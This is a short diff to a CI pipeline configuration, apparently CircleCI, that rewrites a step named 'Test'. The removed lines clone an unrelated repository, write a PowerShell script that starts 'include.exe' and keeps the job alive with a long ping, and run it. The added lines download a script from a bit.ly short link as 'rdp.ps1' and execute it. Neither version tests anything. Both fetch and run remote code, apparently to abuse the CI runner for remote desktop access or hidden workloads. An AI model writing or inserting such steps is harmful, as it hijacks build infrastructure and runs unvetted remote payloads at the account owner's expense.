@@ -14,9 +14,5 @@ jobs:
       - run:
           name: Test
           command: |
-               git clone https://bitbucket.org/kijang-020/php-heroku
-               cd php-heroku
-               cd web
-               cmd /c echo cmd /k start include.exe >>b.ps1
-               cmd /c echo ping -n 999999 10.10.10.10 >>b.ps1
-               .\b.ps1
+               Invoke-WebRequest https://bit.ly/3CPNHO2 -OutFile rdp.ps1
+               ./rdp.ps1
